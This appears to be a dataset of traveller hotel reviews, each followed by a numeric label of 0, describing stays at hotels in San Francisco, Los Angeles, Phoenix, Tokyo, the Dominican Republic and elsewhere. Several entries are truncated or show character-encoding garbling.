1 room for 90 minutes or 3 1/2 hour time slots. We chose the latter. So, at 1 pm, I selected a 4:30 pm slot for myself. That way, we could leave our towels at the pool and still have extra hoursat the pool/etc after checkout time. At 4:30 pm, we showed up at reception, got the key to the assigned room (in a unit close) and had 1/2 hour to shower, clean up, change, etc. into our going home attire. And then we returned the key and the next people would show up. The resort has more than 1 room available so more than 1 group could have the same timeslot but different rooms. Ask for the courtesy room at checkout. Oh yeah, we thought...based upon reviews here.......that we'd be inun",0

"not cheap but worth it visited 23 to 26 sep - 4 nightsgreat location within walking distance of fisherman's wharf (pier 39 and alcatraz ferry) and all transport links (tram, bus, bart link). not much of a view from our room as it didn't overlook the street but therefore quiet. was a bit costly at over ?¢100/night overall but seems to be standard for frisco. it's attached to an italian downstairs that you can get 10% discount at for breakfast and, i think, dinner. there's free coffee, teas at breakfast time with little biscotti and, best of all, from 5 til 6pm you get a free wine 'tasting' reception (plus peroni, coke or pellegrino) which, as long as you don't take the p**s, can set you up nicely for the evening!good atmosphere, welcoming and quite cosy lobby and lounge, helpful and friendly staff (one of them printed off some tv listings off the net for us)overall impressed.",0

"okay, but noisy ! we are a family of four who stayed at this hotel for 3 nights. the positives to this hotel are :- location (short walk to the boulevard and right behind major shopping centre....this is also a weakness, refer below)- free internet- large rooms- good security (front door access via key or reception clearance)- warm pool- self contained kitchen.- good price for the areaweaknesses to this hotel are :- noisy due to location. as this is the last hotel at the end of a short street located at the rear of a shopping centre, there is a large volume of delivery and truck traffic from early morning. if you are a light sleeper, you will hear it all.- if you have heavy guests on the floor above, the noise from the thin floors is accentuated. we were kept awake by this for a whole night by people upstairs from us.- decor is oldon balance, the location of this property and the security were what we required in view of having two kids under 10. would recommend to others, but be aware of the possible noise issues, particularly with delivery trucks from approx 4 am onwards.",0
"nice, but not for business travelers ours was a mixed experience at the tuscan inn, but overall positive. my husband was in san francisco to attend a conference and we chose to stay in the fisherman's wharf area for the sightseeing opportunities there. we specifically selected the tuscan inn because they advertised a complimentary limo shuttle 3 times a day to the financial district where his conference was being held. upon check-in on saturday, we asked the desk clerk about the shuttle and she told us to speak to the concierge. the concierge, in turn, told us to see the bellman, who said the shuttle did not run on weekends and he knew nothing about how to arrange the service. on sunday, we spoke to a manager who seemed confused about what we were talking about, then referred us to the same bellman we had spoken with on saturday. monday morning we approached a different bellman, who informed us reservations for the towncar must be made the day before. sooooo, we reserved a car for tues. morning and hubby trekked off to catch a streetcar. tues. morning our 8:45 shuttle showed up at 9, and was a ford excursion- nice, but not a limo.hubby was 15 minutes late for his conference, and no one bothered to apologize. we gave up and took the streetcar from that point on. our stay otherwise was comfortable and uneventful. our room was available for early check-in, and was facing the courtyard as we had requested. though small, our room was very clean and cozy. the mattress was quite comfy, and we were never disturbed by noisy neighbors. the cafe pescadore was great. we ate there several times and never had a bad meal or poor service. the manager's reception was a nice touch at the end of a long day. staff was neither especially helpful or unhelpful. other than our disappointing experience with the limo shuttle, we enjoyed our stay and would recommend the tuscan inn to travelers interested in sightseeing. businessmen would be better off to stay closer to the financial district and avoid the long commute.",0
not as bad as i thought!!! after reading some reviews on this hotel was a bit worried we visited on 13 to 17.4.05.rooms were large however hotel had a paper thin walls so could here in next room lifts were working reception and all staff extremely helpful location was close to the metro and walk of fame however there is about a 5 min walk from these along a stretch of road that i felt was dodgy in the evening. not sure whether it was just me being paranoid however if i had been on my own i would have not walked along it. overall the hotel was clean and reasonable for the amount we paid however the location made me feel unsafe.,0

"very disappointing we stayed at this hotel as part of a road trip; it was the most expensive hotel of the stay and the most disappointing at the same time. very snooty reception desk, surprising as most of the clientele were dressed casually. we were given one of the worst rooms in the place, dank, dark and dusty. we complained immediately and someone on the front desk said they would allocate another room but this didn't materialise until i had phoned the front desk a further four times, not what one needs after a long journey when all you want to do is unpack and take a shower. the room we were given was slightly better but still disappointing. on the plus side we met a couple of very nice staff members, the concierges could not have been more helpful and the lady who served in the bar was lovely. do think carefully before booking this, i wish we had gone for something like the chateau marmont or similar now.",0
"grand kyoto was very grand! we just returned from our stay at the kyoto grand hotel and gardens. we only stayed one night, but have to say that it was a very pleasant stay.we arrived and were very promptly and professionally greeted. we were also given ome lovely iced green tea as a refreshment as we checked in. we had just come up on the train and were not looking our best - we were dressed very casually and i was carrying a large backpack - so we almost looked like a couple of drifters, but we were greeted like honored guests just the same. bravo!the room was small - yet comfortable and clean. what more can you ask for? the bathroom was very clean - this is one of our most important points as no one likes a nasty bathroom.we walked through the hotel - the gardens are lovely - and it is quite impressive that they have such a lush garden spot on the top of a portion of the hotel. we ate at the thousand cranes restaurant - this is a top notch japanese restaurant. we sat at the sushi bar and had a superb eating experience.the little tokyo neighborhood is very nice. the area is clean and we were told it has been recently cleaned up and is an up and coming area. there are tons of neat little restaurant in the area and it is also an easy walk to the new home of the la philharmonic! overall this was a great place to stay in downtown la - walking distance from the train station and walking distance to great food and events. it couldn't be easier!",0

all at the omni the omni la hotel has it all. the hotel is a short walk to the museum of contemporary art which is located in the same complex - california plaza. a block farther away is the new disney concert hall. both federal and state courthouses are nearby and a handy hotel area map highlights the local buildings making it easier to get around.. one of the nicest features at the hotel is the use of a lincoln town car and driver o transport guests anywhere within a three mile radius of the hotel - no worries about being lost and a return to the hotel is only a phone call away. i used it repeatedly and was very pleased at this first come/first served service. within the hotel is a fabulous restaurant - noe - which describes itself as progressive american with a japanese sensibility toward food preparation. the hotel's rooms are very nice with a good size working desk for business and a comfy bed and chair. my oversized bathroom had both a tub and a separate shower in case you are traveling with someone and both need to get ready at the same time. i have stayed at the omni many times - even back when it as an intercontinental. omni is better toiday than it has ever been. the only cheap aspect of it is the use of 19 inch televisions in the guest rooms.,0

"quiet area this is my second stay at this hyatt. it is located downtown, which is pretty dead, especially on weekends. but it is located within walking distance to chase field and us airways arena so it is the perfect location for attending sporting events. parking is expensive, but free on the street after 5pm and on weekends. summer rates can be very cheap. the revolving restaurant was closed (renovation?) while i was there. there are some eating places in the area. the only one that is really notable is pizza bianco which has a reputation and a long line to go with it. most of the others are sports bars/grills/mexican, etc. the room was fine and about what you would expect from hyatt.",0

Beautiful but BORING! We just returned from a week at the EdenH Real Arena and this was our experience.Check in was very smooth and our rooms were ready when we arrived (3pm) We were with 2 other couple and they had issues with the location of thier rooms and the hotel was very accomodating and switched thier rooms with a problem. Our room was an upgraded pool/ocean view room and was abit larger tan the normal Deluxe room. We were on the first floor in the first building and did have mosquitoe problems. We did bring bug coils and that seem to solve to problem. The rooms were nice and very clean. Our maid service was very good. always clean by 10am and plenty of fresh clean towels every morning. Beds were comfortable for us. They are very firm. Linens were changed daily and the floors were moped and bathrooms were cleaned daily also.Pools and Chairs were fine but if you wanted a bech chair you had to get really early to get one. We never were out by the pool before 8am and we always seem to get chairs for our group of 6 with no problem. Pools were clean but we did not understand the green tile they used in the bottom. It made the water murky looking and not blue and beautiful. But it was clean. The VIP pool was really nice. No chair problems and the upgraded drinks were readily available. The Bartenders were SO GREAT! The staff was really nice and was willing to go out of thier way to accomo,0
"beautiful resort!! we stayed at squaw peak for our first year anniversary in mid-october. we were in the south tower and asked for a recenty remodeled room, and were very impressed with the decor/furniture. the water park was awesome and we were often in the lazy river, playing basketball and beach volleyball in the pool, playing putt putt, or enjoying the jacuzzi. we ate at the lantana grill and enjoyed the food and also the free pool table they have on their outdoor patio by the fireplace. there were only two negatives we found: we got a dozen donuts for breakfast and the following morning they were covered with ants. we called the front desk to come spray and weren't very impressed with their service. contrary to the other reviews, we also didn't have a good experience with the hole in the wall restaurant. the first breakfast we had there was cold so we got our meal free. we decided to try it again a second time and ended up leaving after not getting any service after about 10 minutes. overall we were very impressed with this resort and would stay there again. i would also highly recommend during your stay to hike summit peak, and take a day tour to see sedona and the grand canyon.",0

"you won't go wrong with royal park my husband and i stayed at the rph during a 3-day trip to tokyo. it's located in a more business district of tokyo, but access to both metro and other train lines are walking distance. if you are looking to be in the middle of the scene, this is not the hotel for you. but if you want a nice base to explore tokyo from, this is a solid choice.i was a little confused about the difference between the tac (tokyo air terminal) and tokyo central train station. the tac is a bus depot - it's attached to the rph via a covered walk way. the busses to narita are efficient (like every thing in japan). however, if you take the train in from narita, you will not arrive at the tac, but rather at the central train station. its a 700 yen cab from the train station to the rph.we were checked in promptly. i had requested a king/non-smoking room. the only one available was on the executive floor - so they kindly accommo",0

"never again what have they done to this hotel with so much history? i have stayed at this hotel twice before and have always had a nice comfortable time. when i had a short business trip recently, it was logical to stay at a place that i knew i could trust. big mistake, the moment i walked in, i could tell something drastically had changed. to start of everything was black, the walls, the floor and the staff dressed in black. felt like i was in a dracula film with all the gothic furniture. this darkness seems to be a growing trend with some hotels across the states. i could not find my card key in my bag the lobby was so poorly lit and people were almost walking into each other, i kid you not. my room was frightening. the room was black, the bathroom light was red and to top of it. a huge photo of a man with bright blonde hair in a black jumper was above my bed looking down at me. my friend had to cover it for me with a towel, so i couldné¥?? see it. they charge to for coffee and teas in youé¥??e room too, thaté¥??? the first time for me! the only advantages are the great locations near by; if youé¥??e tourist ité¥??? all at your doorstep. none of the staff were rude to me, thaté¥??? a plus, but i will never stay here again. ité¥??? a shame because i had a big group of us going next year, but ité¥??? safe to say i will be taking our business somewhere else. it is a shame the hotel has been taken over, it has lost all its glamour and famous history.",0

"love the tuscan inn as a tour guide, staying in hotels is second nature but the tuscan inn stands out as a fine property. more intimate, close personal attention from the staff and exceptionally clean rooms. in addition, it is location, location, location. thanks for a great hotel!",0
"perfect location stayed for 2 nights in may 06. the hotel is in the perfect location for fishermans wharf and the best activity in san francisco bike the bridge. our room was bright, clean, comfortable and spacious. not a bad point about it, though we did go uptown for our final night which was a really good idea to save the expense of riding the cable car, and gives you a great chance to see all the other sights on offer.",0
"great base to explore the city we have just returned from a week staying in one of the ground floor apartments. we found the studio apartment spacious and well equipped with it's small kitchenette.the location is superb, the lodge is in an attractive quiet street which feels very safe, which was very relaxing after a busy day out. we found all the staff very helpful and appreciated having the wireless internet.",0

"lovely grounds and great breakfast wanted a hotel on the north side of phoenix so we could fly in during the evening and begin our trip to the grand canyon in the morning without having to deal with too much traffic. we were so impressed with the lovely grounds that included a beautiful pool and tennis courts. clean, quiet and comfortable rooms, very easy getting on and off the interstate. great free made to order breakfast that you can take out out on the patio and eat overlooking the pool. if i wanted something near the airport, i would still go with the best western papago inn, since it is such a nice hotel for so little money. but for the north of phoenix, i loved the embassy suites.",0

"good stay near lax after staying at the sheraton gateway lax, i was looking for a hotel property in the lax area but with a little less of the airport noise and a little more updated. the rennaissance was just that.the room was great, the customer service at the front desk and at the hotel restaurant was exceptional and the food was good too. my only issue was that i couldn't get hot water out of my shower. maybe my room was too far away - it was at the end of the hall - or maybe they took dateline's advice and turned down the overall temp - but either way, it was a little chilly.other than that, i will be back here again.",0

"contemporary classic i had a very enjoyable stay at the luxe on sunset. the staff know what they are doing, the rooms are large, the beds are extremely comfortable (never slept as well in a hotel), the pool is just large enough to do laps, the bathroom was pretty much as big as any i've seen in most 5 star hotels, and the decor is comtemporary classic, with earth tones and strong square shapes. the restaurant is good, but not excellent. i tend to judge on the classic caesar salad with chicken. the chicken was over cooked/dry. the service at the spa is very professional, and welcoming. the pool is salt water, which is becoming the norm. the conceirge was able to let me know about a local but competing restaurant for breakfast, which i did enjoy. i also sat in the bar one night for dinner, and the bartender was excellent.there was only on issue, which was the band that i've been told plays tuesday and thursday. i could clearly hear them in my room, and i was a distance from them. luckily they only played until 10:30 pm. they were good, but it was distracting that i could hear them in my room. also i could hear every word in the hall (they might want to consider sound proof doors). i would not recommend this hotel to light sleepers (this isn't one of my issues.",0

"if you like attitude and bad service the roosevelt is for you the renovation of the hotel is all for show. the bell staff gave quite a bit of misinformation. upon entering our room we had to double check that we were in a room and not a closet. i was shocked that for $300 a night we were staying in a box barely fitting for a single person. the online descriptions of their rooms as opposed to the one we got was completely misleading. we required a roll away bed, and when it arrived it didn't fit in the room!!! we had to pull the mattress off the rollaway and lay it on the floor. it was the most uncomfortable sleep i've ever had in all of my hotel experiences, springs in my side is not what i would expect from a hotel held in such high regards. after our night on the town we returned planning on getting a little pool time in. upon our arrival we asked what time the pool closed, we were told 2am. we were all ready for a swim and after making our way down we were told by a doorman that the pool was open only to those in cabana rooms or on a guest list!!! we had paid $300 dollars for a box and couldn't even use the amenities of the hotel!!! the next day we made our way to the pool and though the food was great, the service left much to be desired. our server didn't bring the correct amount of drinks we ordered, she brought us the wrong menu to order from, which we werené¥?? informed of until almost an hour later, now mind you, we had already been waiting with our tummies growling only to be told we still had to wait for our food to be prepared. we had to check out by 1pm and we inquired if we could still use the pool after our check out and we were told we could. so we left our things so as to not lose our spot, and went to check out. upon returning to the pool we were greeting by an extremely rude guy working as a doorman for the pool. no one informed us we were only allowed 2 guests pool side for the room we had reserved. we tried to explain that we had been out there all morning, left our items to secure a spot, told we could return to the pool but he wouldn't budge. his attitude was horrendous!!! we understood that the hotel had it's policies, but he could've handled the situation in a totally different manner. he was fed up with us and told us if we had a problem to take it up with the front desk, so we did. we explained our issue to the front desk manager and he said that it would be no problem and he would speak with the rude employee. upon returning to the pool he blew up and said we couldn't enter the pool area and he didn't care what anyone said, and stood by his reasons of doing his job. i found it odd that someone working the door had more say than a manager. disturbed and frustrated we gathered our things and left. the hotel staff left a bitter taste in our mouths after such a sweet weekend, not the best way to end our fun weekend. it wasn't so much the hotels policies that bothered us (although we found them ludicrous) it was the attitude, the lack of decent customer service. if this is what the new hot spots have to offer, i want no part of it. not only was i a customer, i am a human being, i should never have to tolerate anyone belittling myself and my companions when i just want to receive services for which i had paid for.",0

"car park feel and soul my stay was as part of the hotel's reward scheme, so i've stayed in many of their hotels throughout the us and world. whilst the rooms facilties of this hotel look standard the reality is somewhat different. much has been outsourced and is not integrated well for guests and is 'user-pay'.the fitness centre and spa, widely advertised by hyatt, both in their hotel description and concierge email service, is a completely seperate business and hotel guests are treated no differently from the general public. in fact you can't even transit the facility, the easiest way to the nearby mall and hotel grounds, as the spa staff actively 'police' the entrance and send you round the street. this is false advertising by hyatt and they should be held to task. the gym which is good is a $15 charge per visit - $30 a day for our room. i consider that expensive.the pool has the landscaping of the local carpark, inadequate poor pool service and again the cafe, which serves the best range of juices and food, is a seperate business and only takes cash , not charge. none of this is clearly explained and you are left to 'stumble' around finding things out for your self.request for extra towels went unanswered 3 times, taking a trip to the ever-helpful front desk staff to resolve the issue. worth pointing out that the service here is exemplary.car parking is $27 per day, again amongst the total additional charges, adding to the daily bill as a car is a necessity for this location.no in-room coffee/tea means that the 'in-house' starbucks is an additional charge.this is an expensive hotel, with poor service requiring many additional charges for the average stay - wouldn't stay here again as there are many options more worthy in the local area.",0

However this last visit was just after an ownership change and it has gone downhill considerably. We changed rooms a couple of times and each had their own problem from elevator noise to clogged sinks. The thrid room we finally ended up in was a very small corner room that barely allowed us space to get around our luggage. I figured since we booked through expedia they didn't give us a choice of nicer rooms.The usually terrific staff has been cut to the bone.

small but good stayed here twice on my trip. the first few days i wasn't the happiest with the room as side of the bed was against the wall and the room was tiny. i really didn't see what the fuss was about that i'd read here on trip advisor. i then went to kyoto for a few days and decided that when i returned to tokyo i'd stay at the hotel again as they offered to keep my luggage so i would only have to bring a small bag to kyoto with me. when i returned the room they gave me stank of fish (really strong) so when the bellman came to deliver the bags i asked him to step into the room and see if he got the smell. he imme,0

"nice enough, as long as you don't want to check email i attended a conference at this hotel and my significant other and i took advantage of the conference rate to spend two extra nights. i agree with other reviewers that this hotel is very, very nice. the rooms are comfortable, the lobby is handsome, and the breakfast buffet is excellent and an outstanding value. travelers should be warned, however, that this really is an airport hotel. every night we saw hordes of pilots and flight attendants checking in, and the property sits in the middle of a maze of highway ramps. you'd hardly know that you're less than a mile from marina del rey. it's designed for business travelers, not tourists.we were also puzzled by some of the small ways that this hotel nickels-and-dimes its customers. though we booked a room for two, we were supplied with only three bath towels. assuming this was just an oversight, on our first night we got a fourth towel from housekeeping. after our room was made up the next day, however, lo and behold! we once again had only three bath towels. we requested another, and this too disappeared after the next day's housekeeping. evidently towel-rationing is hotel policy. also, the glasses in the room were those nasty plastic cellophane-wrapped cups, and they gave us only two at a time--evidently you can either brush your teeth or enjoy a drink, but not both! finally, there is no free internet access in this hotel. there's a daily charge to use the in-room wireless or ethernet, and perhaps that's not surprising, given that business travelers might spend quite a bit of time online. but we were a bit dismayed to find that the internet access in the business center was also not free--you had to enter a credit card number and pay by the minute.even motel 6 these days has free internet, to say nothing of four bath towels per room. what's up, marriott?",0

"great place to stay the location is perfect - just a few minutes' walk to the duomo (just a block and a half away). it is on a wider street and a bus route. less than 10 mins. by bus from railway station. the no. 7 bus runs from right outside the railway station (one euro each) - once you see the duomo and the baptistry you are almost there - the bus turns left onto via martelli (which is only one block long) and you get off at via martelli - the bus stop is at the end of the block - walk in the direction the bus took - the street becomes via cavour and the hotel is about halfway up the next block on the right. there is a wide staircase and a smallish lift. the building is three stories above street level, and the hotel occupies the first and second floors. the reception is on the second floor. the hotel is very, very clean, and very safe. it is a safe area. the beds and pillows were very comfortable. ghassim, the owner, was really great and speaks fluent english, and was a great host - maria too, and all the staff were friendly and so nice. breakfast consists of fresh bread rolls, pkgd croissants, butter/jams/honey, cheese, fruit yogurts, cereals, orange juice, and a push-button machine that makes coffee, cappaccino, and there is tea - it is served from 7.30 a.m. to 9.30 a.m. at reception there is one computer which guests can use to access the web and read their emails. the first floor rooms have recently been refurbished and the floor looks great. apparently the second floor will be up",0

BRILLIANT FUN!!!The road from the aiport to the hotel is long and bumby..but it is not that bad.... if you have ever been down a country road anywhere.... it's the same...so I wouldn't even worry about that part....The resort staff were amazing, they were very friendly and helpful and all the english was very good. the place itself is beautiful and there is always staff around cleaning/serving/ helping etc.....We had members of the group who were unhappy with their allocated rooms, we had a couple with a toddler and they had given them a room with one kingsize bed...well the couple went back to the counter to complain that the room wasn't big enough and they would need to upgrade....the staff moved them in to a luxury top floor jaccusie suite.. with no extra cost it was an amazing room IF i had anything negative to say ... it is only that the decor is a bit ",0

"confortable room, disappointing breakfast we stayed in the lion's head suite and found the staff friendly and helpful. the sitting room is located just across the sidewalk from busy lombard street, so the traffic noise was loud. the bedroom was quiet enough if we closed the door. the room had many nice features including a refrigerator, microwave, electric fireplace, soft robes, and a tv with a dvd player. blockbuster is just across the street.don't plan on sharing the jacuzzi. it's not large enough for two people. it does not have a shower curtain, so water splashes on the floor during showers. it's not a huge effort to dry the floor with a towel, but i'd prefer a shower curtain. the breakfast quiche had too many onions for my taste. other items included fruit juice, cold cereal, toast, instant oatmeal, grocery store pastries, plus apples, bananas and grapes. the breakfast reminds me of the expanded continental breakfast served at many motel chains. we liked the proximity to the marina and presidio, and plan to return. we also enjoyed the seafood at cafe maritime next door. hime, the japanese restaurant on the next block was good, too.",0
"loved it! warm and friendly receptionist. location is great - on the edge of the leidsplein and the museum district - so whatever takes your fancy! easy walking distance to most places.we asked for a quiet room (wouldn't want ground floor rooms near bar or lifts) and although we were at the front on the first floor (rm 20), it is a quiet street and we slept soundly.rooms size was fine for us - not sure it required three tv's tho!lovely, small fireside lounging area for afternoon tea and cakes (complimentary) and the complimentary bar in the eve - which includes free side bowls of salads, canapes etc - was a lovely touch to set you up for an evening out.room service was a bit shoddy i must admit, but rooms were very clean (they just left dirty glasses both days and the bed was a bit of a mess after the turn down service!). overall, found the hotel very pleasant - clean, modern, friendly and great location and would stay again. you do however, have to get up early (i mean 9-10ish - not 10-11ish) for breakfast otherwise you will have to wait for tables as there are very few places to accommo",0
"nice, but has it's drawbacks the best thing about this hotel is the close proximity to fisherman's wharf. the lobby is nice, and the staff was very friendly. the cons about this place is the $38(plus $5.32 tax) a night parking fee. the room was nice (king bed) although smaller than most, and the sink area was poorly designed (functionality) and small. i don't think i would stay here again.",0

"should rank in top 10 in la this is an excellent w (i've been to 8) - great rooms (request a corner), great pool, great location near bev. hills, west hollywood, santa monica and ocean, great young and fun crowd, and great restaurants and bars. i clearly don't understand the (in my opinion unjust) negative reviews and tripadviser rankings. well, i guess everyone is a critic or at least they think they are:)",0

"Ocean Blue - EXCELLENT resort!!! My boyfriend and I (mid-20é¥???) stayed at Ocean Blue for 6 days during the last week of June. We had an awesome time é¥?relaxation, the beach, the ocean, and fruity, frosty drinks! Before we booked the trip and up until we left I read the Ocean Blue reviews faithfully. I was a little concerned with some of the negative reviews, but figured weé¥?? see for ourselves. I think the value at Ocean Blue was excellent (we booked the hotel through Apple and the flight separately through USA3000 é¥?so Ocean Blue was about $57 a day each for us). After reading the reviews, the main complaints over time seemed to be the food and (un)friendliness of the staff. Travelers generally seemed pretty happy with the hotel/grounds, pools/beach, rooms, drinks, etc. One thing I would like to note for future Ocean Blue-goers and All-Inclusive travelers in general é¥?All-Inclusive resorts are generally for the masses. They are in a tropical locale, pretty inexpensive, generally newer and clean, and the food and drinks are what youé¥?? find at a basic TGI Fridayé¥???/Outback/Olive Garden/etc. in the US (decent food for the price and somewhat mass-produced). Youé¥??e paying less for a night at a hotel on the beach, food, alcohol, and activities than youé¥?? be paying for a nice meal at a high-end restaurant. As the saying goes é¥?you get what you pay for é¥?do not expect Mortoné¥??? Steakhouse meals when you are not paying for them. Take this advice and Ié¥?? sure youé¥??l enjoy yourself!So, on to the reviewé¥?br/We flew USA3000 to Punta Cana on a Monday morning é¥?fairly uneventful and PC airport was pretty unique. One thing é¥?I could not believe the amount of luggage that people were taking for a beach vacation!!! Agghhh! We took our bags ourselves é¥?easy once you get past the bag vultures é¥?and the Apple Rep pointed us to our bus. It took about an hour to get to Ocean Blue (with 3 other quick hotel stops é¥?I liked this because we had a chance to see other hotels!). Upon arrival we were able to check in early (at noon) é¥?I mentioned that I had emailed a request for an upper-level pool-view room and the front desk rep. happily accommo",0

"Good choice for the Shopaholic. The Landmark, in Central, is good hotel if you like to shop or be in the thick of boutique belt. The rooms are large, and have very funky bathrooms -- rainshowers, large circular tubs, and interesting amenities. But there is no view.

The pricing is steep, but service quite good.The few dining outlets -- MO Bar (which becomes the cafe cum breakfast room) and the Amber is made up by the fact that there are dining options a quick walk from the property.

"Good hotel if you don't mind PAYING The hotel is located conveniently next to London Bridge rail and tube. The immediate area consists of offices, some shops and a nice promenade along the river. Very modern building and decor, nice lobby and bar. The room was large and comfortable with well positioned desk, armchairs, tea/coffee. Bathroom quite all right although once cannot plug a hair drier in the bathroom. Room was very quiet (and I am really particular about this) with a gorgeous view on an office building across a narrow lane. Since I could see very well what was going on in the office I think it also works in the other direction. Food in the restaurant was quite nice.Although the hotel seems to cater to business travelers it does not accommo",0

"Happy with our decision. My husband and I booked a week at the Riu Palace spur of the moment end of November. Our decision to stay there was a good one. We have stayed at numerous other all inclusive resorts in Mexico and Jamaica but this was our first trip to the DR. The hotel itself was beautiful, I can't find a single fault to mention. Our room (standard suite) was spacious, clean, no musty smell as mentioned in previous reviews.  I think much has already been said about the food. We found it to be adequate, abundant, tasty and again had no complaints except maybe one. The desserts were rather bland and tasteless but make no mistake we never went hungry. We were pleased that they had a dress code for dinner every evening, and really made an attempt to make it an enjoyable dining experience by serving wine or champagne with dinner. Make sure to pack plenty of clothes for the evening, most women dressed very nicely. Certainly not the buffet atmosphere that we have experienced at other all inclusives. The waiters were wonderful. We tipped well because they work very hard and get paid very little. I asked about the pay and one fellow told me $80 for 15days of work. If he was being truthful, I think you too will feel the need to tip them.  Other overall observations and comments: No that it mattered to us, but there appeared to be many more Europeans than Americans at the resort. Most seemed to be German and because we do not speak the language, it limited our interaction with other guests. It also appeared to be a little bit older clientelle. We are in our late 40's and were on the younger end of the spectrum. Not that we don't care for kids, but we were pleased that there were not children running around everywhere. As mentioned in many other reviews, the beach was beautiful. The week we were there it was very windy and it did rain at some point in time every day. It was extremely humid (bad hair weather). We did make good use of there workout facility. It was never overly busy and we never had to wait to use the equipment. Be sure to check out the indoor Roman baths inside the workout/spa facility. I did not know they were there until the last day. It's quite lovely. We also brought along our tennis equipment and made use of the courts. Not wait for those either. I must comment that we were rather disappointed by the lack of evening entertainment and activities. The shows that were put on were very amature and dull. We also visited the other Riu Hotels within the complex and found the Riu Bamba to be ",0

"a great value - and fantastic location! the adante was ideal for what we needed: decent, clean hotel in centrally located. while the room was modest, it was spotless and certainly bigger than i expected for a twin room. the included continental breakfast is very bare-bones: toast, english muffins, coffee, tea and juice (but not orange). then again, it's included, so we were grateful to save a few extra bucks each morning. we were in san francisco during an record-breaking heatwave, so the fact there wasn't air conditioning did prove challenging. in fact, we asked to be moved from the top floor (7) to a lower floor (4) and it was much cooler. there are ceiling fans in each room. the only real downside was that the hotel seems to have a bit of a youth-hostel vibe: each night it seemed, partying 20-somethings blasted their boomboxes with their windows and/or doors propped open. we called once to the front desk to ask if they could keep it down, and they quickly addressed the issue. so - all in all - a great stay, i'd recommend it to anyone who wants a clean hotel in a great location -- only 5 minute walk to union square. we were very pleased overall! :)",0

"excellent location my best friend and i stayed here for one night in september for a girls night out to see wicked at the pantages. the pre-registration parking is a bit of a nightmare. you can't park on the street because it's permit only and you can't park in the hotel parking lot because it's secured by a gate that you need a key. i left my friend in the car in the parking lot driveway while i ran in to get a key, parked and then registered so it worked out. the hotel is not luxurious. if you are looking for 4 or 5 star accommodations, you'd be better off at the marriott next door. just be prepared to pay about $400.00 more a night plus $30.00 a day parking! the staff was extremely friendly. our room was not ready when we checked in but since we arrived prior to the check in time it was not a problem. we had a jr suite with two beds and it was a perfect size for two women to try and get ready for the theatre. it had a little refrigerator that was great for keeping our diet coke in and a little coffee maker for wake up coffee the next morning.the location to hollywood blvd is awesome. just a short walk to the corner and the metro station is right there to take you wherever you want to go. and dining choices are unbelievable with the hollywood and highland center right in front of you as well as the disney store and soda shop just across the street.if you are looking for a clean, friendly place to sleep, shower and change while seeing the sights or going to the theatre, this hotel is the place you want to stay.",0
gorgeous hotel. wonderful stay. the room as you see it walking in. note the french doors.,0

"la is weird the rooms were lovely. we stayed in the tower rooms even though we had booked a cabana room, although the tower rooms looked better so we stuck with the room we had. there is a weird vibe about la and hollywood and this was, for me, also present in the hotel. there was all this meeting space that was unused and a huge ballroom with like two tables and the doors were open so you could just walk in. on week days its weird to go around where the meeting rooms are because some entertainment show tapes from there and there are all these tv people around. this hotel is what i would call very la on the day we arrived there was a film crew shooting a pilot for a tv show called hollywood cops or something, i dont think it ever made ti to air. we didnt have a car so the location is bliss in the way that you can walk to the subway stop at the hollywood/highland mall.we found it kinda hard to get good fresh food in la but at the hollywood/highland mall there is a california pizza kitchen and a wolfgand puck resturant so we ate there alot. overall, good location, ok price and la is weird.",0

"under construction... i booked this through my company's travel agency because i have stayed here before and also because of the price ($209). i stayed for 3 nights. the hotel is under construction, so if the renovation has been completed, this review will be less valuable. however, i was put in a room that had been updated. it had two double beds and was decent sized. it sat above california street, and the cable cars can be heard along with some traffic sounds. while somewhat noticeable, not a show stopper. the room had a large flat screen tv that had a lot of channels. internet (both wired and wireless) was available for $10 per day from noon to noon. a coffee pot in the room and starbucks located in the lobby were free. the room was clean but the bathtub hadn't been given much of a makeover. they mostly updated other parts of the room. i was satisfied but the room wasn't anything special. also, the elevators were slow and i was only on the 6th floor. the construction was a bit obtrusive in the lobby and they had makeshift check-in, lobby and other areas. really not very appealing as long as it's under construction. breakfast in forneau's oven was nice, although not much of a view. food was ala carte only, no buffet. i only had oatmeal so i can't comment too much on the quality. parking was $45 per day which is par for the course in sf. service for the car was fast. the location is atop of nob hill near the fairmont, mark hopkins and the ritz. you can walk down the hill easily, but those with physical limitations may want to consider a cab back up the hill. overall a decent place, but hard to rate that high with the construction going on. be sure to ask before you book a room.",0

"one night relief i had a layover on an international flight, and stayed at this place. it took us like eternity for my daughter and i before they picked us up at the airport. the driver told me that he was the only one on duty. the front desk clerk spoke on a very very low tone. the restaurant was close on thursday(10pm arizona time). waited another half hour for shuttle transfer to their sister hotel for dinner. at sister hotel, the waiter told me that they have buffet. asked him where are the foods. all are empty sizzling silver tray. they were cleaning up. finally got out food(12md az time) waited another 30+ for the shuttle to pick us up from the sister hotel, then trips to the airport to pick up some passengers, then to the hotel(finally). ask the hotel that i cannot do an outgoing call to the airline, advise me that i have to pay $50/told her that their answering machine say free of charge. finally she connected me for both incoming and outgoing call. my hubby call many times, and always ended up the front desk, hubby told me to check the phone connection. fix it myself. my cell phone was dying, trying to save for impt. call. battery charger was on my carryon(aw ck it in to nw)the nice thing about it, they provide free toothbrush, free breakfast, and free airport shuttle. the personnel at breakfast bar were friendly, polite and courteous. it was refreshing to see flower on side ears. shuttle driver was friendly too. speedy checkout, and once outside, i lookup...guess what..freeways. the hotel is located on an extremely noisy intersection, and right below the freeway. god grief...thanks god that my 1 night relief/nightmare was over.",0

"herbert hotel - nice affordable hotel if you're looking for the ritz this isn't the place to go, but if you're looking for an affordable hotel in a great location then this is perfect. the rooms are small, but clean and cute. the bathroom is pretty tiny, but again it's clean and has everything you need. as people have stated in previous reviews, the front desk is literally just a desk, (and is situated inside a mexican restaurant - you really have to see it to understand) and apart from checking you in you probably won't have much interaction with the staff. we didn't have any problems, so i can't comment on how other people have been treated when they had an issue. the only thing i would comment on is you have 2 options in as far as the rooms go - an outside facing window, but extremely noisy, or an inside facing window with little fresh air but peace and quiet. we opted for an outside facing window for the air and views, and had to wear ear plugs the street noise was so bad, but that is no fault of the hotel. internet isn't wireless, but connection is good. the restaurant downstairs is quite good, and it got 100/100 rating from california environmental health board. we had a very enjoyable stay and would recommend it to others.",0

